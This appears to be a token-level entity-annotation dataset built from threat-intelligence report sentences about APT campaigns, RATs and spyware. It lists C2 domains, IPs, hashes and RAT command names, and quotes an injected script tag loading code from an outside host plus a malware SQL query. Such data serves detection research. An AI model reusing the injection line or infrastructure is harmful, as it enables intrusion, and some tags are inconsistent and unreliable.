can	O
carry	O
out	O
the	O
following	O
malicious	O
tasks	O
:	O
Recursively	O
generate	O
a	O
list	O
of	O
files	O
in	O
a	O
directory	O
and	O
send	O
to	O
the	O
control	O
server	O
Terminate	O
a	O
specific	O
process	O
.	O

The	O
doping	O
allegations	O
and	O
prospective	O
ban	O
from	O
the	O
Games	O
further	O
ostracized	O
Russia	O
,	O
and	O
likely	O
provided	O
motivation	O
to	O
actively	O
counter	O
the	O
allegations	O
by	O
attempting	O
to	O
discredit	O
anti-doping	O
agencies	O
and	O
policies	O
.	O

0ABF3FA976372CBC8BF33162795E42A8	B-hash
powerhost.zapto.org	B-url.cncsvr

Command	O
Data	O
Before	O
Encryption/After	O
Decryption	O

The	O
implementation	O
of	O
this	O
data	O
structure	O
is	O
based	O
on	O
a	O
hash	O
table	O
.	O

This	O
document	O
will	O
provide	O
information	O
about	O
the	O
recent	O
phishing	O
campaigns	O
observed	O
with	O
this	O
RAT	B-malware.backdoor
and	O
some	O
of	O
the	O
network	O
indicators	O
.	O

Seeing	O
from	O
the	O
POC	O
created	O
by	O
using	O
the	O
exploit	O
samples	O
we	O
captured	O
,	O
the	O
principles	O
of	O
the	O
exploit	O
is	O
obvious	O
.	O

The	O
GitHub	O
project	O
was	O
used	O
by	O
the	O
attacker	O
to	O
create	O
the	O
malicious	O
BOptionspro.dylib	O
library	O
held	O
in	O
the	O
iOS	O
package	O
(	O
.ipa	O
file	O
)	O
.	O

The	O
following	O
samples	O
were	O
examined	O
:	O
324783fbc33ec117f971cca77ef7ceaf7ce229a74edd6e2b3bd0effd9ed10dcc	O
الفعاليات.rar	O
c5b39d98c85b21f8ac1bedd91f0b6510ea255411cf19c726545c1d0a23035914	O
_gpj.ArrestedXSuspects.rar	O
c5b37bb3620d4e7635c261e5810d628fc50e4ab06b843d78105a12cfbbea40d7	O
KingXhamadXonXofficialXvisitXtoX.rar	O
80fb86e265d44fbabac942f7b26c973944d2ace8a8268c094c3527b83169b3cc	O
MeetingXAgenda.rar	O
f846301e7f190ee3bb2d3821971cc2456617edc2060b07729415c45633a5a751	O
Rajab.rar	O
These	O
contained	O
executables	O
masquerading	O
as	O
picture	O
files	O
or	O
documents	O
:	O
49000fc53412bfda157417e2335410cf69ac26b66b0818a3be7eff589669d040	O
dialoge.exe	B-malware.infosteal
cc3b65a0f559fa5e6bf4e60eef3bffe8d568a93dbb850f78bdd3560f38218b5c	O
gpj.1bajaR.exe	B-malware.infosteal
39b325bd19e0fe6e3e0fca355c2afddfe19cdd14ebda7a5fc96491fc66e0faba	O
gpj.1egami.exe	B-malware.infosteal
e48bfeab2aca1741e6da62f8b8fc9e39078db574881691a464effe797222e632	O
gpj.bajaR.exe	B-malware.infosteal
2ec6814e4bad0cb03db6e241aabdc5e59661fb580bd870bdb50a39f1748b1d14	O
gpj.stcepsuS	O
detserrA.exe	B-malware.infosteal
c29052dc6ee8257ec6c74618b6175abd6eb4400412c99ff34763ff6e20bab864	O
News	O
about	O
the	O
existence	O
of	O
a	O
new	O
dialogue	O
between	O
AlWefaq	O
&	O
Govt..doc	O
The	O
emails	O
generally	O
suggested	O
that	O
the	O
attachments	O
contained	O
political	O
content	O
of	O
interest	O
to	O
pro-democracy	O
activists	O
and	O
dissidents	O
.	O

Both	O
groups	O
were	O
also	O
used	O
a	O
well-known	O
proxy	O
tool	O
named	O
HTRAN	O
,	O
which	O
is	O
an	O
abbreviation	O
for	O
'	O
HUC	O
Packet	O
Transmit	O
Tool	O
'	O
2	O
.	O

In	O
both	O
countries	O
,	O
the	O
compromised	O
websites	O
have	O
been	O
particularly	O
notable	O
for	O
their	O
relevance	O
to	O
current	O
events	O
and	O
the	O
high	O
profile	O
nature	O
of	O
the	O
organizations	O
involved	O
.	O

On	O
the	O
reference	O
victim	O
host	O
,	O
the	O
directory	O
was	O
:	O
We	O
conducted	O
forensic	O
examination	O
of	O
the	O
files	O
created	O
in	O
this	O
directory	O
and	O
identified	O
a	O
wide	O
range	O
of	O
data	O
collected	O
.	O

In	O
this	O
scenario	O
,	O
the	O
attacker	O
chose	O
an	O
RSA	O
modulus	O
length	O
of	O
512	O
bits	O
,	O
which	O
is	O
considered	O
insecure	O
by	O
today	O
's	O
standards	O
and	O
may	O
be	O
cracked	O
with	O
notable	O
effort	O
.	O

Dino	B-malware.backdoor
adds	O
at	O
least	O
two	O
more	O
indicators	O
to	O
those	O
already	O
documented	O
suggesting	O
that	O
Animal	O
Farm	O
developers	O
are	O
French	O
speaking	O
:	O
Dino	B-malware.backdoor
's	O
binary	O
contains	O
a	O
resource	O
whose	O
language	O
code	O
value	O
is	O
1036	O
.	O

Here	O
is	O
the	O
list	O
of	O
the	O
PHP	O
pages	O
available	O
on	O
the	O
techwach	O
C2	O
server	O
:	O
all.php	O
dyrKztORKwVWOGo.php	O
get.php	O
hh.php	O
info.php	O
jDRucchWSoWQGpU.php	O
UfmcRxYDaVVbrBl.php	O
Another	O
intriguing	O
aspect	O
of	O
this	O
malware	O
is	O
the	O
way	O
in	O
which	O
the	O
malicious	O
code	O
achieves	O
periodic	O
code	O
execution	O
when	O
the	O
legitimate	O
app	O
bundled	O
with	O
it	O
is	O
running	O
.	O

?	O
0	O
3b	O
c7	O
74	O
?	O
?	O
}	O

It	O
also	O
uses	O
clever	O
social	O
engineering	O
to	O
trick	O
users	O
into	O
enabling	O
macros	O
if	O
they	O
are	O
n't	O
already	O
enabled	O
.	O

This	O
advisory	O
mentions	O
the	O
C2	O
server	O
infrastructure	O
of	O
GravityRAT	B-malware.drop
,	O
which	O
means	O
the	O
GravityRAT	B-malware.drop
author	O
likely	O
targeted	O
Indian	O
entities/organisations	O
.	O

'	O
FIN	O
900	O
Confirmation	O
of	O
Debit	O
'	O
'	O
20	O
:	O
Transaction	O
'	O
'	O
Sender	O
:	O
'	O
[	O
additional	O
filters	O
from	O
the	O
decrypted	O
configuration	O
file	O
gpca.dat	O
]	O

Load	O
a	O
DLL	O
into	O
the	O
specified	O
process	O
Terminate	O
ZxShell	B-malware.backdoor
DLL	O
Uninstall	O
and	O
terminate	O
ZxShell	B-malware.backdoor
bot	O
DLL	O
Share	O
a	O
shell	O
to	O
other	O
Switch	O
off	O
Windows	O
Firewall	O
File	O
Manager	O
Remote	O
Desktop	O
Port	O
Forwarding	O
Video	O
Device	O
Spying	O
Add	O
and	O
load	O
a	O
ZxShell	B-malware.backdoor
custom	O
plugin	O

GET	O
/	O
HTTP/1.1\r\n\r\n	O

The	O
combination	O
of	O
a	O
remotely	O
included	O
Flash	B-malware.backdoor
exploit	I-malware.backdoor
and	O
asymmetric	O
cryptography	O
are	O
particularly	O
powerful	O
counters	O
against	O
postmortem	O
analysis	O
.	O

The	O
decoded	O
binary	O
will	O
be	O
written	O
to	O
the	O
filesystem	O
as	O

COMMAND_WEBCAM	O
COMMAND_SCREEN_SPY	O
COMMAND_KEYBOARD	O
COMMAND_AUDIO	O
COMMAND_SCREEN_BLOCK_INPUT	O
COMMAND_PSLIST	O

.	O

-	O
Michael	O
Jackson	O

It	O
's	O
also	O
getting	O
quite	O
difficult	O
to	O
attribute	O
the	O
attacks	O
to	O
any	O
state-sponsored	O
unit	O
,	O
both	O
because	O
there	O
's	O
a	O
generic	O
lack	O
of	O
strong	O
evidence	O
in	O
such	O
incidents	O
(	O
which	O
is	O
why	O
we	O
refrained	O
from	O
making	O
any	O
statement	O
on	O
the	O
origin	O
of	O
these	O
intrusions	O
)	O
but	O
frankly	O
also	O
because	O
almost	O
anybody	O
could	O
operate	O
such	O
campaigns	O
and	O
be	O
reasonably	O
successful	O
.	O

The	O
actual	O
implant	O
is	O
packaged	O
in	O
the	O
resource	O
section	O
of	O
the	O
dropper	O
with	O
a	O
fake	O
bitmap	O
(	O
BMP	O
)	O
header	O
,	O
as	O
shown	O
in	O
Figure	O
8	O
.	O

Unlike	O
most	O
malwares	O
,	O
CopyKittens	B-malware.backdoor
'	O
tools	O
are	O
bound	O
to	O
each	O
other	O
.	O

Among	O
the	O
FinSpy	B-malware.backdoor
servers	O
we	O
found	O
,	O
7	O
were	O
in	O
countries	O
we	O
had	O
n't	O
seen	O
before	O
.	O

During	O
stage-two	O
,	O
the	O
payload	O
will	O
register	O
a	O
new	O
,	O
second	O
service	O
under	O
the	O
name	O
RaS	O
?	O
?	O
?	O

http://www.symantec.com/content/en/us/enterprise/media/security_respo	B-url.normal
nse/whitepapers/w32_stuxnet_dossier.pdf	I-url.normal
Albright	O
,	O
D.	O
,	O
Brannan	O
P.	O
,	O
Walrond	O
,	O
C.	O
'	O
Did	O
Stuxnet	B-malware.backdoor
Take	O
Out	O
1,000	O
Centrifuges	O
at	O
the	O
Natanz	O
Enrichment	O
Plant	O
?	O
'	O

IP	O
Address	O
IP	O
Address	O
IP	O
Address	O
IP	O
Address	O
IP	O
Address	O
4639c30b3666cb11b3927d5579790a88bff68e8137f18241f4693e0d4539c608	B-hash
Malware	O
Hash	O
809959f390d5a49c8999ad6fff27fdc92ff1b2b0	B-hash
Malware	O
Hash	O
ab58b6aa7dcc25d8f6e4b70a24e0ccede0d5f6129df02a9e61293c1d7d7640a2	B-hash
Malware	O
Hash	O
e8a8ffe39040fe36e95217b4e4f1316177d675ed	B-hash
Malware	O
Hash	O
file.googlecaches.com	B-url.unknown
gtm.googlecaches.com	B-url.unknown
js.googlewebcache.com	B-url.unknown
owa.outlookssl.com	B-url.unknown
122.10.10.161	B-ip.unknown
204.152.199.43	B-ip.unknown
50.2.24.211	B-ip.unknown
bak.mailaunch.com	B-url.unknown
f1890cc9d6dc84021426834063394539414f68d8	B-hash
us-mg6.mail.yahoo.mailaunch.com	B-url.unknown
Hostname	O
Hostname	O
Hostname	O
Hostname	O
IP	O
Address	O
IP	O
Address	O
IP	O
Address	O
Hostname	O
Malware	O
Hash	O
Hostname	O

Specifically	O
,	O
carefully	O
consider	O
which	O
ports	O
should	O
be	O
connecting	O
outbound	O
versus	O
inbound	O
.	O

It	O
exposes	O
functions	O
for	O
both	O
reconnaissance	O
and	O
attack	O
.	O

Function	O

This	O
makes	O
the	O
keylogger	O
a	O
perfect	O
weapons	O
for	O
the	O
attackers	O
.	O

The	O
authors	O
of	O
the	O
device	O
driver	O
designed	O
the	O
driver	O
to	O
work	O
on	O
Windows	O
2000	O
and	O
later	O
versions	O
of	O
the	O
Windows	O
operating	O
system	O
.	O

The	O
header	O
for	O
the	O
command	O
packets	O
takes	O
the	O
following	O
form	O
:	O

If	O
the	O
file	O
is	O
present	O
,	O
it	O
runs	O
this	O
executable	O
.	O

For	O
the	O
record	O
,	O
this	O
Dino	B-malware.backdoor
sample	O
is	O
not	O
the	O
only	O
Animal	O
Farm	O
binary	O
with	O
1036	O
as	O
language	O
code	O
.	O

VPN-Pro.exe	B-malware.drop

SELECT	O
*	O
FROM	O
(	O
SELECT	O
JRNL_DISPLAY_TEXT	O
,	O
JRNL_DATE_TIME	O
FROM	O
SAAOWNER.JRNL_%s	O
WHERE	O
JRNL_DISPLAY_TEXT	O
LIKE	O
'	O
%	O
%	O
LT	O
BBHOBDDHA	O
:	O
Log	O
%	O
%	O
'	O
ORDER	O
BY	O
JRNL_DATE_TIME	O
DESC	O
)	O
A	O
WHERE	O
ROWNUM	O
=	O
1	O
;	O

Based	O
upon	O
these	O
correlations	O
,	O
we	O
believe	O
Beebus	B-malware.infosteal
to	O
be	O
yet	O
another	O
TTP	O
associated	O
with	O
threat	O
actors	O
based	O
in	O
China	O
.	O

File	O
export	O
module	O
name	O
:	O
ReverseMet.dll	O
.	O

Moreover	O
,	O
some	O
basic	O
blocks	O
push	O
one	O
address	O
on	O
the	O
stack	O
,	O
then	O
end	O
with	O
a	O
JMP/CALL	O
while	O
other	O
basic	O
blocks	O
push	O
two	O
addresses	O
then	O
end	O
with	O
a	O
RET	O
instruction	O
.	O

Reconstructed	O
the	O
VNC	O
server	O
of	O
process	O
injecting	O
and	O
connecting	O
with	O
targeted	O
system	O
.	O

The	O
Web	B-malware.ransom
shell	O
client	O
contains	O
a	O
'	O
Security	O
Scan	O
'	O
feature	O
,	O
independent	O
of	O
the	O
payload	O
,	O
that	O
gives	O
the	O
attacker	O
the	O
ability	O
to	O
spider	O
and	O
use	O
brute-force	O
password	O
guessing	O
against	O
authentication	O
portals	O
.	O

It	O
uses	O
HTTP	O
to	O
communicate	O
with	O
the	O
C	O
&	O
C	O
server	O
and	O

The	O
malicious	O
document	O
with	O
instructions	O
to	O
enable	O
content	O
.	O

<	O
script	O
language=javascript	O
src=	B-url.normal
http://java-se.com/o.js	I-url.normal
<	I-url.normal
/script	I-url.normal
>	I-url.normal

The	O
malware	O
retrieves	O
the	O
first	O
10	O
bytes	O
of	O
the	O
username	O
(	O
UTF-16	O
)	O
,	O
XORs	O
it	O
with	O
the	O
3-letter	O
UTF-16	O
mutex_encoding_str	O
string	O
,	O
and	O
encodes	O
it	O
in	O
hex	O
.	O

While	O
the	O
sale	O
of	O
such	O
intrusion	O
and	O
surveillance	O
software	O
is	O
largely	O
unregulated	O
,	O
the	O
issue	O
has	O
drawn	O
increased	O
high-level	O
scrutiny	O
.	O

This	O
set	O
of	O
functionality	O
allows	O
the	O
operator	O
complete	O
control	O
of	O
a	O
system	O
.	O

Deobfuscated	O
Perl	O
payload	O
from	O
the	O
delivery	O
document	O

The	O
malware	O
calls	O
ZwSetInformationThread	O
with	O
ThreadInformationClass	O
set	O
to	O
0x11	O
,	O
which	O
causes	O
the	O
thread	O
to	O
be	O
detached	O
from	O
the	O
debugger	O
.	O

Finally	O
,	O
it	O
calls	O
StartService	O
(	O
)	O
to	O
execute	O
the	O
second	O
component	O
,	O
namely	O
the	O
RAT	B-malware.backdoor
server	O
that	O
will	O
have	O
total	O
control	O
over	O
the	O
compromised	O
host	O
from	O
now	O
on	O
.	O

Here	O
's	O
a	O
snippet	O
of	O
an	O
extensions	O
list	O
from	O
a	O
2015	O
BE	O
sample	O
that	O
is	O
even	O
longer	O
:	O
Nevertheless	O
,	O
the	O
lists	O
were	O
similar	O
in	O
the	O
sense	O
of	O
being	O
stored	O
in	O
the	O
same	O
dot-separated	O
formats	O
.	O

An	O
interesting	O
feature	O
of	O
this	O
threat	O
,	O
which	O
drew	O
our	O
team	O
to	O
the	O
challenge	O
of	O
analyzing	O
it	O
,	O
is	O
that	O
it	O
features	O
a	O
network	O
of	O
malicious	O
subdomains	O
,	O
each	O
one	O
used	O
for	O
a	O
specifi	O
c	O
task	O
(	O
download	O
,	O
upload	O
,	O
RAT	O
related	O
actions	O
,	O
malware	O
DLL	O
delivery	O
)	O
.	O

Dark	B-malware.backdoor
Comet	I-malware.backdoor
's	O
pretty	O
logo	O

Animal	O
Farm	O
is	O
the	O
security	O
industry	O
's	O
name	O
for	O
a	O
group	O
of	O
attackers	O
first	O
described	O
by	O
Canada	O
's	O
Communications	O
Security	O
Establishment	O
(	O
CSE	O
)	O
in	O
a	O
set	O
of	O
slides	O
leaked	O
by	O
Edward	O
Snowden	O
in	O
March	O
2014	O
.	O

All	O
were	O
created	O
in	O
the	O
span	O
of	O
a	O
month	O
from	O
mid-October	O
to	O
late	O
November	O
.	O

3/10	O
The	O
contents	O
of	O
this	O
resource	O
is	O
decompressed	O
from	O
offset	O
54	O
,	O
with	O
the	O
last	O
4	O
bytes	O
of	O
the	O
file	O
specifying	O
the	O
ZIP	O
's	O
file	O
size	O
in	O
bytes	O
.	O

The	O
downloaded	O
ZIP	O
file	O
contains	O
four	O
files	O
.	O

The	O
way	O
the	O
first	O
stage	O
payload	O
downloads	O
the	O
second	O
payload	O
is	O
both	O
interesting	O
and	O
unique	O
.	O

Subhosts	O
and	O
urls	O
:	O
tisone360.com/img_h/ims2/icon.swf	B-url.normal
tisone360.com/img_h/ims2/1.php	B-url.normal
tisone360.com/img_h/ims2/icon.jpg	B-url.normal
tisone360.com/noname/img/movie.swf	B-url.normal
tisone360.com/noname/minky/face.php	B-url.normal
tisone360.com/htdoc/ImageView.hta	B-url.normal
tisone360.com/htdoc/page1/page.html	B-url.normal
daily.enewsbank.net/wmpsrx64	B-url.normal
daily.enewsbank.net/newsviewer.hta	B-url.normal
saytargetworld.net/season/nextpage.php	B-url.normal
sendspace.servermsys.com/wnctprx	B-url.normal
error-page.net/update/load.php	B-url.normal
photo.storyonboard.net/wmpsrx64	B-url.normal
photo.storyonboard.net/photoviewer.hta	B-url.normal
photo.storyonboard.net/readme.php	B-url.normal
unionnewsreport.net/aeroflot_bonus/ticket.php	B-url.normal
www.openofficev.info/xopen88/office2	B-url.normal
www.openofficev.info/dec98/unzip.js	B-url.normal
www.openofficev.info/open99/office32	B-url.normal
www.openofficev.info/decod9/unzip.js	B-url.normal

Web	O
.	O

This	O
whitepaper	O
takes	O
an	O
in-depth	O
look	O
at	O
the	O
the	O
attack	O
chain	O
,	O
the	O
infrastructure	O
used	O
by	O
the	O
threat	O
actors	O
,	O
the	O
malware	O
subdomains	O
they	O
control	O
and	O
the	O
payloads	O
delivered	O
on	O
the	O
targeted	O
systems	O
,	O
as	O
well	O
as	O
other	O
telltale	O
signs	O
about	O
a	O
possible	O
return	O
of	O
the	O
Iron	O
Tiger	O
APT	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
logic	O
used	O
to	O
extract	O
the	O
URL	O
and	O
the	O
command	O
string	O
,	O
in	O
the	O
below	O
screen	O
shot	O
the	O
extracted	O
command	O
string	O
is	O
stored	O
in	O
the	O
variable	O
ServerUpdatePermissionInstruction	O
.	O

This	O
toolmark	O
was	O
obtained	O
using	O
physical	O
memory	O
assessment	O
of	O
the	O
live	O
executable	O
,	O
after	O
it	O
was	O
allowed	O
to	O
unpack	O
itself	O
in	O
a	O
virtual	O
machine	O
.	O

In	O
2010	O
,	O
we	O
observed	O
it	O
re-purposing	O
articles	O
on	O
North	O
Korea	O
by	O
the	O
US	O
think-tank	O
,	O
Brookings	O
Institute	O
,	O
in	O
order	O
to	O
attack	O
North	O
Korean-related	O
targets	O
with	O
malicious	O
code	O
buried	O
in	O
.hta	O
files	O
.	O

This	O
method	O
takes	O
the	O
function	O
code	O
and	O
expected	O
response	O
code	O
,	O
and	O
serializes	O
the	O
commands	O
payload	O
over	O
UDP	O
.	O

This	O
file	O
appears	O
to	O
contain	O
the	O
sent	O
/	O
received	O
file	O
.	O

HTA	O
md5	O
:	O
021685613fb739dec7303247212c3b09	B-hash
1ee3dfce97ab318b416c1ba7463ee405	B-hash
2899f4099c76232d6362fd62ab730741	B-hash
2dee887b20a06b8e556e878c62e46e13	B-hash
6b9e9b2dc97ff0b26a8a61ba95ca8ff6	B-hash
852a9411a949add69386a72805c8cb05	B-hash
be59994b5008a0be48934a9c5771dfa5	B-hash
e29693ce15acd552f1a0435e2d31d6df	B-hash
fa67142728e40a2a4e97ccc6db919f2b	B-hash
fef8fda27deb3e950ba1a71968ec7466	B-hash

They	O
resolve	O
them	O
in	O
runtime	O
using	O
a	O
simple	O
substitute	O
cipher	O
combined	O
with	O
Base64	O
encoding	O
.	O

The	O
malware	O
's	O
functionality	O
,	O
briefly	O
summarized	O
below	O
,	O
was	O
covered	O
in	O
some	O
detail	O
in	O
community	O
postings	O
,	O
such	O
as	O
Kaspersky	O
's	O
Securelist	O
blog	O
.	O

OSCE	O

We	O
do	O
not	O
believe	O
this	O
to	O
be	O
a	O
state­sponsored	O
attack	O
but	O
rather	O
a	O
commercial	O
threat	O
player	O
.	O

by	O
Daniel	O
Lunghi	O
and	O
Jaromir	O
Horejsi	O

This	O
works	O
because	O
in	O
Delphi	O
,	O
the	O
AnsiString	O
class	O
stores	O
its	O
length	O
at	O
an	O
offset	O
of	O
4	O
bytes	O
in	O
front	O
of	O
the	O
first	O
actual	O
byte	O
of	O
string	O
content	O
:	O

Since	O
the	O
port	O
of	O
the	O
sample	O
CC	O
server	O
is	O
closed	O
,	O
we	O
can	O
not	O
get	O
the	O
next	O
load	O
for	O
analysis	O
.	O

remoteShell	O

YARA	O
:	O

This	O
C2	O
scheme	O
would	O
seem	O
to	O
dictate	O
:	O
Intruder	O
remote	O
access	O
to	O
the	O
'	O
master	O
'	O
system	O
Intruder	O
local	O
access	O
to	O
the	O
'	O
master	O
'	O
system	O
a	O
C2	O
delivery/retrieval	O
component	O
,	O
such	O
as	O
another	O
piece	O
of	O
code	O
that	O
downloads	O
a	O
C2	O
file	O
Available	O
information	O
precludes	O
determination	O
of	O
the	O
means	O
of	O
exfiltration	O
.	O

IDENTIFIED	O

moayy2ad@hotmail.com	B-url.normal

After	O
the	O
decryption	O
algorithm	O
xor	O
0xA4	O
,	O
and	O
subtracted	O
0x34	O
,	O
the	O
code	O
is	O
as	O
follows	O
.	O

Receiving	O
commands	O
from	O
C	O
&	O
C	O
server	O

To	O
start	O
its	O
connection	O
to	O
its	O
C	O
&	O
C	O
server	O
,	O
the	O
backdoor	O
component	B-malware.backdoor
will	O
first	O
send	O
5-bytes	O
(	O
\x01\x00\x00\x00\x33	O
)	O
.	O

Backdoor.HIXOR.A	O
Trojan.A!tr	O
Launcher/	O
Dropper	O
Legit	O
Cisco	O
AnyConnect	O
Mobility	O
Client	O
installer	O
Malware	O
installer	O
Malicious	O
Malicious	O
Malicious	O
a7bd555866ae1c161f78630a638850e7	B-hash
Win-Release-web-deploy	O
.	O

The	O
actor	O
behind	O
the	O
attacks	O
is	O
assumed	O
to	O
be	O
French	O
inteligence	O
.	O

that	O
enabled	O
them	O
to	O
execute	O
commands	O
,	O
deploy	O
their	O
tools	O
and	O
steal	O
valuable	O
data	O
from	O
the	O
compromised	O
machines	O
.	O

A	O
Google+	O
profile	O
with	O
a	O
similar	O
nickname	O
–	O
Mo'ay	O
-	O
was	O
connected	O
to	O
this	O
address	O
.	O

Figure	O
16	O
:	O
Viewing	O
the	O
source	O
of	O
the	O
Web	B-malware.ransom
shell	O
reveals	O
nothing	O
to	O
the	O
client	O

fileSizeOf	O
:	O
]	O

Figure	O
7	O
–	O
Python	O
code	O
of	O
Linux	O
ransomware	O
Python/Filecoder.R	O
used	O
by	O
the	O
TeleBots	O
group	O
.	O

FinSpy	B-malware.backdoor
servers	O
were	O
apparently	O
updated	O
again	O
in	O
October	O
2012	O
to	O
disable	O
this	O
newer	O
fingerprinting	O
technique	O
,	O
although	O
it	O
was	O
never	O
publicly	O
described	O
.	O

The	O
following	O
pseudocode	O
is	O
used	O
to	O
create	O
the	O
shellcode	O
:	O

While	O
DLL	B-malware.backdoor
preloading	I-malware.backdoor
has	O
been	O
used	O
by	O
other	O
malware	O
in	O
the	O
past	O
,	O
it	O
is	O
less	O
common	O
to	O
see	O
it	O
specifically	O
target	O
.	O

2016년	O
처음	O
발견된	O
이후	O
2018년	O
5월	O
현재까지	O
18개	O
변형이	O
확인되었다	O
.	O

This	O
variant	O
uses	O
the	O
same	O
method	O
as	O
G2	O
,	O
and	O
includes	O
a	O
legitimate	O
library	O
in	O
the	O
resource	O
section	O
.	O

Since	O
the	O
original	O
Pafish	O
code	O
is	O
built	O
to	O
improve	O
security	O
researchers	O
'	O
ability	O
to	O
discover	O
evasive	O
malware	O
,	O
the	O
CopyKittens	B-malware.backdoor
group	O
has	O
modified	O
the	O
code	O
logic	O
.	O

Strings	O
(	O
c2	O
domains	O
and	O
functionality	O
,	O
error	O
messages	O
,	O
etc	O
)	O
are	O
custom	O
encrypted	O
per	O
deployment	O
.	O

Certain	O
details	O
,	O
such	O
as	O
using	O
the	O
same	O
infrastructure	O
and	O
targeting	O
,	O
make	O
us	O
believe	O
that	O
Operation	B-malware.infosteal
Daybreak	I-malware.infosteal
is	O
being	O
done	O
by	O
the	O
ScarCruft	B-malware.infosteal
APT	I-malware.infosteal
group	I-malware.infosteal
.	O

The	O
implant	O
has	O
persistence	O
mechanisms	O
and	O
contains	O
functionality	O
to	O
perform	O
command	O
and	O
control	O
communication	O
.	O

The	O
actual	O
hashing	O
algorithm	O
used	O
in	O
Dino	B-malware.backdoor
is	O
the	O
same	O
that	O
was	O
used	O
in	O
Casper	B-malware.unknown
,	O
namely	O
a	O
combination	O
of	O
rotate­left	O
(	O
ROL	O
)	O
of	O
7	O
bits	O
and	O
exclusive­or	O
(	O
XOR	O
)	O
operations	O
.	O

In	O
all	O
16	O
sectors	O
are	O
allocated	O
in	O
total	O
for	O
the	O
VBR	O
.	O

In	O
light	O
of	O
the	O
recent	O
revelation	O
of	O
Indian	O
involvement	O
in	O
the	O
targeting	O
of	O
Telenor	O
,	O
it	O
is	O
critical	O
for	O
us	O
to	O
consider	O
the	O
borderless	O
nature	O
of	O
cyber	O
espionage	O
and	O
to	O
understand	O
how	O
regional	O
cyber	O
conflicts	O
can	O
spill	O
across	O
geographies	O
and	O
affect	O
critical	O
commercial	O
business	O
operations	O
.	O

The	O
web	O
shell	O
supports	O
a	O
form	O
of	O
authentication	O
to	O
protect	O
against	O
unauthorized	O
access	O
.	O

In	O
this	O
case	O
,	O
the	O
'	O
CT	O
'	O
implant	O
is	O
10	O
MB	O
in	O
size	O
,	O
as	O
it	O
has	O
padded	O
null	O
bytes	O
at	O
the	O
end	O
of	O
the	O
file	O
to	O
increase	O
file	O
size	O
in	O
a	O
possible	O
attempt	O
to	O
evade	O
AV	O
engines	O
as	O
described	O
in	O
the	O
previous	O
section	O
on	O
evasion	O
techniques	O
.	O

This	O
module	O
is	O
used	O
to	O
dynamically	O
call	O
external	O
library	O
function	O
by	O
obfuscated	O
the	O
function	O
name	O
,	O
which	O
makes	O
static	O
analysis	O
of	O
this	O
malware	O
more	O
complex	O
.	O

The	O
financial	O
services	O
sector	O
and	O
the	O
aerospace	O
industry	O
were	O
also	O
targeted	O
this	O
quarter	O
.	O

Here	O
is	O
the	O
Tamindir	O
truecrypt	O
page	O
,	O
looks	O
harmless	O
enough	O
.	O

Asset	O
owners	O
employ	O
varied	O
approaches	O
to	O
interface	O
their	O
plant	O
's	O
DCS	O
with	O
the	O
SIS	O
.	O

Example	O
:	O
'	O
!	O
up	O
E	O
:	O
<	O
newline	O
>	O
e:3	O
'	O
Indicates	O
failure	O
to	O
retrieve	O
that	O
CSIDL_WINDOWS	O
path	O
for	O
building	O
of	O
the	O
netwi.drv	O
path	O
during	O
ferry	O
command	O

The	O
code	O
has	O
not	O
been	O
observed	O
on	O
the	O
s_cDS.js	O
file	O
for	O
nearly	O
a	O
month	O
now	O
.	O

Other	O
samples	O
from	O
the	O
identified	O
exploit	O
documents	O
were	O
similar	O
to	O
the	O
one	O
described	O
above	O
with	O
different	O
network	O
callbacks	O
.	O

Lastly	O
we	O
explore	O
various	O
malware	O
design	O
techniques	O
that	O
were	O
not	O
used	O
in	O
the	O
malware	O
such	O
as	O
multiple	O
propagation	O
vectors	O
,	O
0-day	O
exploits	O
,	O
and	O
evasion	O
techniques	O
,	O
thus	O
presenting	O
a	O
proof	O
of	O
concept	O
of	O
the	O
malware	O
's	O
low	O
technical	O
sophistication	O
.	O

getInfoOSX	O

45.114.117.137	B-ip.unknown
)	O
inbox.mailboxhus(.)com	B-url.cncsvr
support.chatconnecting(.)com	B-url.cncsvr

We	O
also	O
created	O
a	O
couple	O
of	O
Yara	O
rules	O
that	O
you	O
can	O
use	O
to	O
scan	O
your	O
systems	O
your	O
collection	O
of	O
malware	O
samples	O
to	O
identify	O
copies	O
of	O
KeyBoy	B-malware.backdoor
:	O
Not	O
a	O
day	O
passes	O
by	O
without	O
hearing	O
of	O
someone	O
hit	O
by	O
a	O
targeted	O
attack	O
.	O

In	O
CozyDuke	B-malware.drop
samples	O
from	O
July	O
of	O
2014	O
,	O
the	O
RC4	O
key	O
has	O
been	O
embedded	O
in	O
the	O
encrypted	O
configuration	O
file	O
.	O

Computer	O
info	O
encrypted	O
with	O
AES256	O
key	O
Figure	O
25	O
.	O

Two	O
of	O
them	O
are	O
Team	O
Viewer	O
components	O
themselves	O
,	O
and	O
another	O
is	O
some	O
sort	O
of	O
backdoor	O
loader	O
.	O

Telenor	O
Pakistan	O
provides	O
voice	O
,	O
data	O
content	O
and	O
mobile	O
communications	O
to	O
more	O
than	O
3,500	O
cities	O
and	O
towns	O
within	O
Pakistan	O
.	O

It	O
can	O
be	O
decoded	O
using	O
the	O
XOR	O
key	O
'	O
0xBF	O
'	O
.	O

The	O
malicious	B-malware.backdoor
code	I-malware.backdoor
starts	O
contacting	O
the	O
previously	O
mentioned	O
Command	O
and	O
Control	O
and	O
downloads	O
this	O
'	O
upnphost.exe	O
'	O
file	O
.	O

APT29	B-malware.backdoor
delivered	O
malware	O
to	O
the	O
political	O
party	O
's	O
systems	O
,	O
established	O
persistence	O
,	O
escalated	O
privileges	O
,	O
enumerated	O
active	O
directory	O
accounts	O
,	O
and	O
exfiltrated	O
email	O
from	O
several	O
accounts	O
through	O
encrypted	O
connections	O
back	O
through	O
operational	O
infrastructure	O
.	O

Alternately	O
,	O
they	O
may	O
also	O
contain	O
a	O
.DOC	O
file	O
that	O
contains	O
exploit	O
code	O
.	O

It	O
has	O
a	O
very	O
long	O
list	O
of	O
security	O
products	O
and	O
other	O
software	O
it	O
detects	O
,	O
and	O
it	O
appears	O
that	O
it	O
detects	O
all	O
major	O
antimalware	O
and	O
antivirus	O
vendor	O
process	O
names	O
.	O

Additional	O
ways	O
our	O
customers	O
can	O
detect	O
and	O
block	O
this	O
threat	O
are	O
listed	O
below	O
.	O

Also	O
,	O
the	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
threat	O
actors	O
left	O
phpinfo.php	O
script	O
on	O
the	O
webserver	O
running	O
on	O
port	O
80	O
with	O
useful	O
information	O
that	O
could	O
expose	O
them	O
.	O

June	O
9	O
,	O
2016	O
DUBNIUM	B-malware.drop
(	O
which	O
shares	O
indicators	O
with	O
what	O
Kaspersky	O
researchers	O
have	O
called	O
DarkHotel	O
